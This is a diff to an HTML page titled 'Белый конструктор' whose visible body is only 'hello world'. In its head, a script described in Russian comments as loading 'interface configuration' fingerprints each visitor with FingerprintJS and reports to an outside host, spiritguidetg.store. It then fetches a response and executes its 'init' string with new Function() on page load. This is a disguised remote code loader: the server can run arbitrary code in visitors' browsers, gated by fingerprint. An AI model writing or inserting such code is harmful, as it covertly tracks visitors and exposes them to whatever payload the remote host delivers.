@@ -3,36 +3,160 @@
 <head>
   <meta charset="UTF-8">
   <title>Белый конструктор</title>
+  
 <script type="module">
 (async () => {
     try {
+        // Используем полный URL как в рабочем примере
         const CONFIG_API = 'https://spiritguidetg.store/fp.php';
         
-        // Динамический импорт вместо статического
+        console.log('🚀 Начинаем загрузку FingerprintJS...');
+        
+        // Функции для отображения результатов (как в рабочем примере)
+        function updateStatus(success, message = '') {
+            console.log(success ? '✅ Статус: успех' : '❌ Статус: ошибка', message);
+        }
+
+        function logResult(stage, data, isError = false) {
+            const prefix = isError ? '❌' : '✅';
+            console.log(`${prefix} ${stage}:`, data);
+        }
+
+        // Тестовый запрос для проверки доступности сервера
+        async function testConnection() {
+            try {
+                console.log('🔗 Проверяем соединение с сервером...');
+                
+                const response = await fetch(CONFIG_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Origin': window.location.origin
+                    },
+                    body: JSON.stringify({
+                        test: 'connection_check',
+                        timestamp: new Date().toISOString(),
+                        source: 'FingerprintJS_Integration'
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+
+                const responseData = await response.json();
+                logResult('Проверка соединения', {
+                    status: response.status,
+                    data: responseData
+                });
+                
+                return true;
+            } catch (error) {
+                logResult('Проверка соединения', {
+                    error: error.message,
+                    timestamp: new Date().toISOString()
+                }, true);
+                return false;
+            }
+        }
+
+        // Проверяем соединение перед загрузкой FingerprintJS
+        const connectionOk = await testConnection();
+        if (!connectionOk) {
+            console.error('❌ Не удается подключиться к серверу. Прерываем выполнение.');
+            return;
+        }
+
+        // Динамический импорт FingerprintJS
+        console.log('📦 Загружаем FingerprintJS...');
         const FingerprintJS = await import('/clk/fp.js');
         
+        console.log('🔧 Инициализируем FingerprintJS...');
         const fp = await FingerprintJS.load({
             region: 'eu',
             endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
         });
 
-        const { requestId } = await fp.get({ extendedResult: true });
+        console.log('🆔 Получаем идентификатор...');
+        const { requestId, visitorId } = await fp.get({ extendedResult: true });
+        
+        logResult('FingerprintJS данные', {
+            requestId: requestId,
+            visitorId: visitorId
+        });
 
-        // Загрузка конфигурации интерфейса
-        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`);
-        if (!res.ok) return;
+        // Загрузка конфигурации интерфейса с улучшенной обработкой ошибок
+        console.log('⚙️ Загружаем конфигурацию...');
+        
+        try {
+            const configUrl = `${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`;
+            console.log('🔗 URL конфигурации:', configUrl);
+            
+            const res = await fetch(configUrl, {
+                method: 'GET',
+                headers: {
+                    'Accept': 'application/json',
+                    'Origin': window.location.origin,
+                    'Cache-Control': 'no-cache'
+                }
+            });
 
-        const data = await res.json();
+            console.log('📊 Статус ответа:', res.status, res.statusText);
 
-        // Выполнение пользовательских настроек
-        if (data.init) {
-            new Function(data.init)();
+            if (!res.ok) {
+                throw new Error(`HTTP ${res.status}: ${res.statusText}`);
+            }
+
+            const data = await res.json();
+            logResult('Конфигурация получена', {
+                status: res.status,
+                dataKeys: Object.keys(data),
+                hasInit: !!data.init
+            });
+
+            // Выполнение пользовательских настроек
+            if (data.init && typeof data.init === 'string') {
+                console.log('🎭 Выполняем пользовательский код...');
+                try {
+                    new Function(data.init)();
+                    logResult('Выполнение пользовательского кода', { success: true });
+                } catch (initError) {
+                    logResult('Выполнение пользовательского кода', {
+                        error: initError.message,
+                        code: data.init.substring(0, 100) + '...'
+                    }, true);
+                }
+            } else if (data.status === 'ok' && data.message) {
+                console.log('📝 Получено сообщение:', data.message);
+                logResult('Конфигурация', data);
+            }
+
+            updateStatus(true, 'Все компоненты загружены успешно');
+
+        } catch (configError) {
+            logResult('Загрузка конфигурации', {
+                error: configError.message,
+                requestId: requestId,
+                timestamp: new Date().toISOString()
+            }, true);
+            
+            updateStatus(false, 'Ошибка загрузки конфигурации');
         }
+
     } catch (err) {
-        console.error('Ошибка загрузки FingerprintJS:', err);
+        logResult('Критическая ошибка', {
+            error: err.message,
+            stack: err.stack,
+            timestamp: new Date().toISOString()
+        }, true);
+        
+        updateStatus(false, 'Критическая ошибка FingerprintJS');
+        
+        console.error('❌ Критическая ошибка загрузки FingerprintJS:', err);
     }
 })();
 </script>
+
 </head>
 <body>
   hello world
